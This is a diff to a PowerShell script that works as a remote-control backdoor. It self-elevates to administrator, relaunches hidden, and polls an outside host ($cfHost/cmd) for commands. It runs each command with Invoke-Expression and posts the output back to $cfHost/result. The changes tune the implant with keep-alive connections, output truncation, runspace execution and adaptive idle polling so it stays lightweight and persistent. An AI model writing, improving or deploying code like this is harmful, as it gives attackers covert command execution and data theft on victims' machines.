@@ -3,7 +3,8 @@ $logFile = Join-Path $PSScriptRoot "shell.txt"
 $maxLogSizeMB = 5
 $retryCount = 0
 $maxRetries = 10
-$cmdTimeout = 30  # seconds — kills commands that run longer than this
+$cmdTimeout = 30
+$maxResultBytes = 64000  # cap output size sent to server (~64KB)
 
 # --- Self-elevate to admin and relaunch hidden ---
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -33,14 +34,26 @@ function Write-Log {
     } catch {}
 }
 
-# --- Lightweight HTTP helpers ---
+# --- Persistent HTTP helper (reuses connection via HttpWebRequest keep-alive) ---
+# ServicePointManager settings: reuse TCP connections, skip cert issues
+[System.Net.ServicePointManager]::DefaultConnectionLimit = 4
+[System.Net.ServicePointManager]::Expect100Continue = $false
+try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 } catch {}
+
 function Get-Command-From-Server {
     try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-        $result = $wc.DownloadString("$cfHost/cmd")
-        $wc.Dispose()
-        return $result.Trim()
+        $req = [System.Net.HttpWebRequest]::Create("$cfHost/cmd")
+        $req.Method = "GET"
+        $req.UserAgent = "Mozilla/5.0"
+        $req.KeepAlive = $true
+        $req.Timeout = 10000       # 10s connect+response timeout
+        $req.ReadWriteTimeout = 10000
+        $resp = $req.GetResponse()
+        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
+        $result = $reader.ReadToEnd().Trim()
+        $reader.Close()
+        $resp.Close()
+        return $result
     } catch {
         throw $_
     }
@@ -49,48 +62,75 @@ function Get-Command-From-Server {
 function Send-Result-To-Server {
     param([string]$Body)
     try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-        $wc.Headers.Add("Content-Type", "text/plain")
-        $wc.UploadString("$cfHost/result", $Body) | Out-Null
-        $wc.Dispose()
+        # Truncate oversized output
+        if ($Body.Length -gt $maxResultBytes) {
+            $Body = $Body.Substring(0, $maxResultBytes) + "`n[...truncated at ${maxResultBytes} bytes]"
+        }
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
+        $req = [System.Net.HttpWebRequest]::Create("$cfHost/result")
+        $req.Method = "POST"
+        $req.UserAgent = "Mozilla/5.0"
+        $req.ContentType = "text/plain; charset=utf-8"
+        $req.KeepAlive = $true
+        $req.Timeout = 15000
+        $req.ContentLength = $bytes.Length
+        $stream = $req.GetRequestStream()
+        $stream.Write($bytes, 0, $bytes.Length)
+        $stream.Close()
+        $resp = $req.GetResponse()
+        $resp.Close()
     } catch {
         Write-Log "Failed to send result: $($_.Exception.Message)" "WARN"
     }
 }
 
-# --- Execute command with timeout ---
+# --- Execute command with timeout (using Runspace — lightweight, no new process) ---
 function Invoke-CommandWithTimeout {
     param([string]$Command, [int]$Timeout)
 
-    $job = Start-Job -ScriptBlock {
-        param($cmd)
+    $runspace = [runspacefactory]::CreateRunspace()
+    $runspace.Open()
+    $ps = [powershell]::Create()
+    $ps.Runspace = $runspace
+    $ps.AddScript(@"
         try {
-            Invoke-Expression $cmd 2>&1 | Out-String
+            Invoke-Expression `$args[0] 2>&1 | Out-String
         } catch {
-            "Error: " + $_.Exception.Message
+            "Error: " + `$_.Exception.Message
         }
-    } -ArgumentList $Command
+"@).AddArgument($Command) | Out-Null
 
-    $finished = $job | Wait-Job -Timeout $Timeout
+    $handle = $ps.BeginInvoke()
 
-    if ($finished) {
-        $output = Receive-Job $job
+    # Wait with timeout
+    $completed = $handle.AsyncWaitHandle.WaitOne($Timeout * 1000)
+
+    if ($completed) {
+        try {
+            $output = $ps.EndInvoke($handle) -join "`n"
+        } catch {
+            $output = "Error collecting output: $($_.Exception.Message)"
+        }
     } else {
-        Stop-Job $job
-        $output = "[!] Command timed out after ${Timeout}s. Partial output may be lost.`n"
+        $ps.Stop()
+        $output = "[!] Command timed out after ${Timeout}s.`n"
         Write-Log "Command timed out: $Command" "WARN"
     }
 
-    Remove-Job $job -Force
-    return ($output | Out-String)
+    $ps.Dispose()
+    $runspace.Close()
+    $runspace.Dispose()
+
+    return $output
 }
 
 # --- Main loop ---
 function Connect-Cloudflare {
-    $idleDelay = 1
-    $activeDelay = 0.3
-    $currentDelay = $idleDelay
+    # Adaptive polling: ramp from 300ms (active) up to 5s (long idle)
+    $activeDelay   = 300     # ms after receiving a command
+    $idleStep1     = 1000    # ms: idle < 10 cycles
+    $idleStep2     = 3000    # ms: idle 10–50 cycles
+    $idleStep3     = 5000    # ms: idle > 50 cycles
     $consecutiveIdle = 0
 
     Write-Log "Client started. PID=$PID. Connecting to $cfHost"
@@ -102,7 +142,6 @@ function Connect-Cloudflare {
             if ($command -and $command -ne "") {
                 $retryCount = 0
                 $consecutiveIdle = 0
-                $currentDelay = $activeDelay
 
                 Write-Log "CMD: $command"
 
@@ -113,19 +152,25 @@ function Connect-Cloudflare {
 
                 $result = Invoke-CommandWithTimeout -Command $command -Timeout $cmdTimeout
 
-                Write-Log "OUT: $($result.Substring(0, [Math]::Min($result.Length, 200)))"
+                # Log first 200 chars
+                $logSnippet = if ($result.Length -gt 200) { $result.Substring(0, 200) } else { $result }
+                Write-Log "OUT: $logSnippet"
 
                 $body = "PS " + (Get-Location).Path + "> " + $command + "`n" + $result + "`n"
                 Send-Result-To-Server -Body $body
+
+                Start-Sleep -Milliseconds $activeDelay
             }
             else {
                 $consecutiveIdle++
-                if ($consecutiveIdle -gt 10) {
-                    $currentDelay = $idleDelay
-                }
-            }
 
-            Start-Sleep -Milliseconds ($currentDelay * 1000)
+                # Adaptive idle delay — ramp up to save resources
+                $delay = if ($consecutiveIdle -le 10) { $idleStep1 }
+                         elseif ($consecutiveIdle -le 50) { $idleStep2 }
+                         else { $idleStep3 }
+
+                Start-Sleep -Milliseconds $delay
+            }
         }
         catch {
             $retryCount++
@@ -140,7 +185,8 @@ function Connect-Cloudflare {
             }
         }
 
-        if (($consecutiveIdle % 100) -eq 0 -and $consecutiveIdle -gt 0) {
+        # Periodic GC during long idle
+        if (($consecutiveIdle % 200) -eq 0 -and $consecutiveIdle -gt 0) {
             [System.GC]::Collect()
         }
     }
